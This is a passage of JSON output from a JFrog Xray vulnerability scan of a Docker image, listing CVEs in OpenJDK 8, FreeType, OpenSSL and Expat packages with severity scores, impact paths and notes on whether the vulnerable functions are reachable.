Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-21587"
                        }
                    ],
                    "created": "2025-04-19T00:00:00.123Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-21587",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-697383",
                    "summary": "An out of bounds write exists in FreeType versions 2.13.0 and below (newer versions of FreeType are not vulnerable) when attempting to parse font subglyph structures related to TrueType GX and variable font files. The vulnerable code assigns a signed short value to an unsigned long and then adds a static value causing it to wrap around and allocate too small of a heap buffer. The code then writes up to 6 signed long integers out of bounds relative to this buffer. This may result in arbitrary code execution. This vulnerability may have been exploited in the wild.",
                    "description": "An out of bounds write exists in FreeType versions 2.13.0 and below (newer versions of FreeType are not vulnerable) when attempting to parse font subglyph structures related to TrueType GX and variable font files. The vulnerable code assigns a signed short value to an unsigned long and then adds a static value causing it to wrap around and allocate too small of a heap buffer. The code then writes up to 6 signed long integers out of bounds relative to this buffer. This may result in arbitrary code execution. This vulnerability may have been exploited in the wild.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-27363",
                            "cvss_v3": "8.1/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2025-05-07T00:00:00.576Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:freetype:2.10.0-r1"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:freetype:2.10.0-r1",
                            "cve_id": "CVE-2025-27363",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks for the following FreeType functions:</p>\n<ul>\n<li><code>TT_Load_Glyph</code></li>\n<li><code>FT_Load_Glyph</code></li>\n<li><code>FT_Get_Advances</code></li>\n<li><code>FT_Get_Advance</code></li>\n<li><code>af_shaper_get_elem</code></li>\n<li><code>FT_Load_Char</code></li>\n<li><code>FT_Glyph_To_Bitmap</code></li>\n<li><code>FT_Render_Glyph</code></li>\n<li><code>FTC_CMapCache_Lookup</code></li>\n<li><code>FTC_ImageCache_Lookup</code></li>\n<li><code>FTC_SBitCache_Lookup</code></li>\n<li><code>FTC_ImageCache_LookupScaler</code></li>\n<li><code>FTC_SBitCache_LookupScaler</code></li>\n<li><code>FTC_Manager_LookupSize</code></li>\n<li><code>FTC_Manager_LookupFace</code></li>\n<li><code>T42_GlyphSlot_Load</code></li>\n</ul>\n<p>An additional condition, which the scanner does not check, is that a user-supplied font is supplied to these functions.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:freetype:2.10.0-r1",
                            "vulnerability_id": "CVE-2025-27363",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-534478",
                    "summary": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
                    "description": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-5363",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2023-10-25T00:00:00.056Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in OpenSSL 3.x may lead to data leakage when processing cipher parameters.",
                        "full_description": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn cryptography, a block cipher is a symmetric key algorithm that encrypts fixed-size blocks of data, typically 64 or 128 bits, transforming each block into a corresponding ciphertext block using a key-specific permutation.\n\nA major problem with block ciphers, is that equal plaintext blocks get transformed to equal ciphertexts. This can be used for a known-plaintext attack, where an adversary possesses both the plaintext and its corresponding encrypted form, aiming to deduce the encryption key or gain insights into the encryption algorithm.\n\nTo counter this, we use an Initialization vector (IV), which is a random or unique input to a cryptographic algorithm used to alter the first block of the cipher, ensuring equal plaintext blocks won’t be transformed to equal ciphertexts.\n\nA vulnerability was found in OpenSSL 3.x, in certain situations, parameters such as key length or IV length, will be processed after the key and IV have been established, hence they will not take effect as intended, potentially causing truncation or overreading of these values, impacting the confidentiality of the encryption.\n\nWhen calling the functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` with an `OSSL_PARAM` array, changes to the `keylen` or `ivlen` parameters will only be processed after the IV and the key have been established.\n\nNote this impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The vulnerability is only applicable if the vulnerable functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` is called directly or indirectly with an `OSSL_PARAM` array that alters the `ivlen` and `keylen` parameters. Moreover, it only impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "Changing the key or IV lengths is not considered a popular operation. Furthermore, the API only affects OpenSSL 3.x and it is likely the app developers have discovered the problem during testing, as it would have caused the decryption to fail.",
                                "is_positive": true
                            },
                            {
                                "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                                "description": "The given CVSS score does not take into account the unlikely prerequisites and the context required to exploit this CVE.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "In the case that this vulnerability is exploited successfully, an attacker can read sensitive data as plaintext, breaking the encryption.",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-5363",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>EVP_EncryptInit_ex2</code></li>\n<li><code>EVP_DecryptInit_ex2</code></li>\n<li><code>EVP_CipherInit_ex2</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-5363",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>EVP_EncryptInit_ex2</code></li>\n<li><code>EVP_DecryptInit_ex2</code></li>\n<li><code>EVP_CipherInit_ex2</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-5363",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-5363",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-588703",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20952",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                        }
                    ],
                    "created": "2024-01-17T00:00:00.965Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2024-20952",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2024-20952",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2024-20952",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20952",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20952",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20952",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607991",
                    "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
                    "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0216",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0216",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks if at least one of the vulnerable functions is called:</p>\n<ul>\n<li><code>d2i_PKCS7()</code></li>\n<li><code>d2i_PKCS7_bio()</code></li>\n<li><code>d2i_PKCS7_fp()</code></li>\n</ul>\n<p>When checking Python files, the scanner checks if at least one of the vulnerable functions is called with external input to its 1st (<code>bytes</code>) argument:</p>\n<ul>\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_der_pkcs7_certificates</code></li>\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_pem_pkcs7_certificates</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable OpenSSL functions are never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0216",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks if at least one of the vulnerable functions is called:</p>\n<ul>\n<li><code>d2i_PKCS7()</code></li>\n<li><code>d2i_PKCS7_bio()</code></li>\n<li><code>d2i_PKCS7_fp()</code></li>\n</ul>\n<p>When checking Python files, the scanner checks if at least one of the vulnerable functions is called with external input to its 1st (<code>bytes</code>) argument:</p>\n<ul>\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_der_pkcs7_certificates</code></li>\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_pem_pkcs7_certificates</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable OpenSSL functions are never called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0216",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0216",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198616",
                    "summary": "In Expat (aka libexpat) before 2.4.5, an attacker can trigger stack exhaustion in build_model via a large nesting depth in the DTD element.",
                    "description": "In Expat (aka libexpat) before 2.4.5, an attacker can trigger stack exhaustion in build_model via a large nesting depth in the DTD element.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-25313",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-02-22T00:00:00.233Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-25313",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-25313",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187948",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35556",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.578Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
